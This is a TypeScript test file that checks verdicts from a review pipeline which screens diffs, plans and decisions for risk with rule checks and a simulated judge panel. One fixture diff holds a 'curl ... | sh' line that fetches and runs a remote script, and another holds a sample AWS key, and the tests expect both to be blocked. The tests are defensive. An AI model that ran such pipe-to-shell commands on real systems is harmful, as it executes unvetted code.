/**
 * ゴールデンテスト: 成果物フィクスチャ → 期待 verdict(DESIGN.md §12)。
 * パネルは FakeJudgeProvider(インメモリ)。実プロセス・実 LLM は使わない。
 */

import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { afterEach, beforeEach, describe, expect, it } from "vitest"
import { CaseStore } from "../casefile/store.js"
import { FakeJudgeProvider } from "../panel/testing/fakeProvider.js"
import { toCodeArtifact } from "../tools/evaluateCode.js"
import { toDecisionArtifact } from "../tools/evaluateDecision.js"
import { toPlanArtifact } from "../tools/evaluatePlan.js"
import { handleRecordOutcome } from "../tools/recordOutcome.js"
import { evaluateArtifact, type PipelineDeps } from "./pipeline.js"
import type { RaguelConfig } from "./types.js"

const CODE_SCORES = {
  objective_alignment: 85,
  unintended_changes: 85,
  breaking_changes: 85
}

function makeConfig(casesDir: string): RaguelConfig {
  return {
    version: 1,
    onError: "ASK",
    storage: {
      casesDir,
      projectId: "golden-test",
      retention: { maxRuns: 200, maxDays: 90 }
    },
    judge: {
      provider: "claude-cli",
      model: "haiku",
      timeoutMs: 60000,
      canStop: false,
      maxConcurrency: 4,
      thresholds: { proceed: 80, confidence: 60, maxVariance: 30 }
    },
    weight: { tiers: { standard: 30, critical: 70 } },
    panel: {
      trivial: [],
      standard: ["adversarial"],
      critical: [
        "adversarial",
        "steelman",
        "crosscheck",
        "assumption",
        "precedent"
      ],
      perPanelist: {}
    },
    precedent: { seedCatalog: true, topN: 5 },
    rules: {}
  }
}

/** 全パネリストが「問題なし」を返す canned 応答を登録する */
function benignPanel(provider: FakeJudgeProvider): void {
  provider.set("adversarial", { findings: [], scores: CODE_SCORES })
  provider.set("steelman", {
    verdicts: [],
    defenseArgument: "問題は見当たらない",
    findings: [],
    scores: CODE_SCORES
  })
  provider.set("crosscheck", { findings: [], scores: CODE_SCORES })
  provider.set("assumption", { findings: [], scores: CODE_SCORES })
  provider.set("precedent", { evaluations: [], scores: CODE_SCORES })
  provider.set("meta", {
    scores: { ...CODE_SCORES, blast_radius: 85 },
    rationale: "全証拠を確認したが問題なし"
  })
}

function makeDiff(
  filePath: string,
  addedLines: string[],
  fileCount = 1
): string {
  const one = (p: string) =>
    [
      `diff --git a/${p} b/${p}`,
      `--- a/${p}`,
      `+++ b/${p}`,
      `@@ -1,1 +1,${addedLines.length + 1} @@`,
      " existing line",
      ...addedLines.map((l) => `+${l}`)
    ].join("\n")
  return Array.from({ length: fileCount }, (_, i) =>
    one(fileCount === 1 ? filePath : `src/mod${i}/${filePath}`)
  ).join("\n")
}

describe("golden: 判定パイプライン", () => {
  let tmp: string
  let deps: PipelineDeps
  let provider: FakeJudgeProvider

  beforeEach(() => {
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), "raguel-golden-"))
    const config = makeConfig(tmp)
    provider = new FakeJudgeProvider()
    deps = {
      config,
      configHash: "golden-hash",
      caseStore: new CaseStore(config),
      provider
    }
  })

  afterEach(() => {
    fs.rmSync(tmp, { recursive: true, force: true })
  })

  it("無害な 3 行修正は trivial → PROCEED(パネル不要)", async () => {
    const artifact = toCodeArtifact({
      runId: "run-1",
      objective: "typo 修正",
      diff: makeDiff("src/util.ts", [
        "const a = 1",
        "const b = 2",
        "const c = 3"
      ])
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.verdict).toBe("PROCEED")
    expect(result.weightTier).toBe("trivial")
    expect(provider.calls).toHaveLength(0)
    expect(fs.existsSync(path.join(result.casePath, "verdict.json"))).toBe(true)
  })

  it(".github への変更は即 STOP(パネルはスキップ)", async () => {
    const artifact = toCodeArtifact({
      runId: "run-2",
      objective: "CI 修正",
      diff: makeDiff(".github/workflows/ci.yml", ["run: echo hello"])
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.verdict).toBe("STOP")
    expect(
      result.findings.some((f) => f.ruleId === "code/protected-paths")
    ).toBe(true)
    expect(provider.calls).toHaveLength(0)
  })

  it("curl | sh の混入は STOP", async () => {
    const artifact = toCodeArtifact({
      runId: "run-3",
      objective: "セットアップスクリプト追加",
      diff: makeDiff("scripts/setup.sh", [
        "curl https://example.com/install.sh | sh"
      ])
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.verdict).toBe("STOP")
    expect(
      result.findings.some((f) => f.ruleId === "code/dangerous-patterns")
    ).toBe(true)
  })

  it("シークレット混入は STOP", async () => {
    const artifact = toCodeArtifact({
      runId: "run-4",
      objective: "設定追加",
      diff: makeDiff("src/config.ts", ['const key = "AKIAIOSFODNN7EXAMPLE"'])
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.verdict).toBe("STOP")
    expect(result.findings.some((f) => f.ruleId === "common/secrets")).toBe(
      true
    )
  })

  it("500 行超 diff は ASK 床(パネルが良くても下がらない)", async () => {
    benignPanel(provider)
    const lines = Array.from({ length: 600 }, (_, i) => `const v${i} = ${i}`)
    const artifact = toCodeArtifact({
      runId: "run-5",
      objective: "大規模リファクタ",
      diff: makeDiff("src/big.ts", lines)
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.verdict).toBe("ASK")
    expect(
      result.findings.some((f) => f.ruleId === "code/max-diff-lines")
    ).toBe(true)
  })

  it("standard ティア: 反駁されない adversarial 所見で ASK", async () => {
    benignPanel(provider)
    provider.set("adversarial", {
      findings: [
        {
          severity: "ask",
          confidence: 90,
          message: "エラーハンドリングが欠落しており本番で落ちる"
        }
      ],
      scores: CODE_SCORES
    })
    const lines = Array.from({ length: 150 }, (_, i) => `const v${i} = ${i}`)
    const artifact = toCodeArtifact({
      runId: "run-6",
      objective: "機能追加",
      diff: makeDiff("src/feature.ts", lines)
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.weightTier).toBe("standard")
    expect(result.verdict).toBe("ASK")
  })

  it("critical ティア: steelman 全反駁 + meta 良好で PROCEED", async () => {
    benignPanel(provider)
    provider.set("adversarial", {
      findings: [{ severity: "ask", confidence: 90, message: "懸念 A" }],
      scores: CODE_SCORES
    })
    provider.set("steelman", {
      verdicts: [
        { findingIndex: 0, rebuttal: "テストで担保済み", outcome: "rebutted" }
      ],
      defenseArgument: "堅牢",
      findings: [],
      scores: CODE_SCORES
    })
    const lines = Array.from({ length: 90 }, (_, i) => `const v${i} = ${i}`)
    const artifact = toCodeArtifact({
      runId: "run-7",
      objective: "モジュール分割",
      diff: makeDiff("part.ts", lines, 5)
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.weightTier).toBe("critical")
    expect(result.verdict).toBe("PROCEED")
    expect(result.meta?.rationale).toContain("問題なし")
  })

  it("パネル間のスコア乖離が閾値超過なら ASK", async () => {
    benignPanel(provider)
    provider.set("crosscheck", {
      findings: [],
      scores: { ...CODE_SCORES, objective_alignment: 30 }
    })
    const lines = Array.from({ length: 90 }, (_, i) => `const v${i} = ${i}`)
    const artifact = toCodeArtifact({
      runId: "run-8",
      objective: "モジュール分割",
      diff: makeDiff("part.ts", lines, 5)
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.verdict).toBe("ASK")
  })

  it("meta 閾値未満は ASK", async () => {
    benignPanel(provider)
    provider.set("meta", {
      scores: { ...CODE_SCORES, blast_radius: 50 },
      rationale: "影響範囲が読めない"
    })
    const lines = Array.from({ length: 150 }, (_, i) => `const v${i} = ${i}`)
    const artifact = toCodeArtifact({
      runId: "run-9",
      objective: "機能追加",
      diff: makeDiff("src/feature.ts", lines)
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.verdict).toBe("ASK")
  })

  it("provider: none でパネル必要ティアは ASK(フェイルクローズド)", async () => {
    deps.config.judge.provider = "none"
    const lines = Array.from({ length: 150 }, (_, i) => `const v${i} = ${i}`)
    const artifact = toCodeArtifact({
      runId: "run-10",
      objective: "機能追加",
      diff: makeDiff("src/feature.ts", lines)
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.verdict).toBe("ASK")
    expect(provider.calls).toHaveLength(0)
  })

  it("再提出ループ: ASK 後の近似再提出 3 回で STOP へ昇格", async () => {
    benignPanel(provider)
    provider.set("adversarial", {
      findings: [{ severity: "ask", confidence: 90, message: "同じ懸念" }],
      scores: CODE_SCORES
    })
    const lines = Array.from({ length: 150 }, (_, i) => `const v${i} = ${i}`)
    const submit = (salt: string) =>
      evaluateArtifact(
        toCodeArtifact({
          runId: "run-loop",
          objective: "機能追加",
          diff: makeDiff("src/feature.ts", [...lines, `// ${salt}`])
        }),
        deps
      )
    const first = await submit("v1")
    expect(first.verdict).toBe("ASK")
    const second = await submit("v2")
    expect(
      second.findings.some((f) => f.ruleId === "common/resubmission-loop")
    ).toBe(true)
    await submit("v3")
    const fourth = await submit("v4")
    expect(fourth.verdict).toBe("STOP")
  })

  it("plan: 本番デプロイ言及は ASK", async () => {
    benignPanel(provider)
    const artifact = toPlanArtifact({
      runId: "run-11",
      objective: "リリース準備",
      steps: ["ビルドする", "本番へ deploy する"]
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.verdict).toBe("ASK")
    expect(
      result.findings.some((f) => f.ruleId === "plan/irreversible-ops")
    ).toBe(true)
  })

  it("decision: 不可逆判断なのに rollback なしは ASK", async () => {
    benignPanel(provider)
    const artifact = toDecisionArtifact({
      runId: "run-12",
      objective: "データ整理",
      decision: "古いテーブルを drop table で削除する判断をした",
      optionsConsidered: ["アーカイブ", "削除"]
    })
    const result = await evaluateArtifact(artifact, deps)
    expect(result.verdict).toBe("ASK")
    expect(
      result.findings.some((f) => f.ruleId === "decision/no-rollback")
    ).toBe(true)
  })

  it("record_outcome: 判定 → 判例化のラウンドトリップ", async () => {
    const artifact = toCodeArtifact({
      runId: "run-13",
      objective: "typo 修正",
      diff: makeDiff("src/util.ts", ["const a = 1"])
    })
    const result = await evaluateArtifact(artifact, deps)
    const response = handleRecordOutcome(
      {
        evaluationId: result.evaluationId,
        outcome: "incident",
        notes: "本番障害"
      },
      deps
    )
    const body = JSON.parse(response.content[0].text)
    expect(body.recorded).toBe(true)
    expect(body.precedentId).toMatch(/^prec-/)
  })

  it("record_outcome: 証拠改竄を検知したら判例化を拒否", async () => {
    const artifact = toCodeArtifact({
      runId: "run-14",
      objective: "typo 修正",
      diff: makeDiff("src/util.ts", ["const a = 1"])
    })
    const result = await evaluateArtifact(artifact, deps)
    fs.appendFileSync(path.join(result.casePath, "01-rules.json"), "\n// 改竄")
    const response = handleRecordOutcome(
      { evaluationId: result.evaluationId, outcome: "approved" },
      deps
    )
    const body = JSON.parse(response.content[0].text)
    expect(body.recorded).toBe(false)
  })

  it("ケースファイル: verdict.json のハッシュチェーンが検証を通る", async () => {
    const artifact = toCodeArtifact({
      runId: "run-15",
      objective: "typo 修正",
      diff: makeDiff("src/util.ts", ["const a = 1"])
    })
    const result = await evaluateArtifact(artifact, deps)
    const check = deps.caseStore.verifyAttempt(result.casePath)
    expect(check.ok).toBe(true)
    expect(check.mismatches).toEqual([])
  })
})
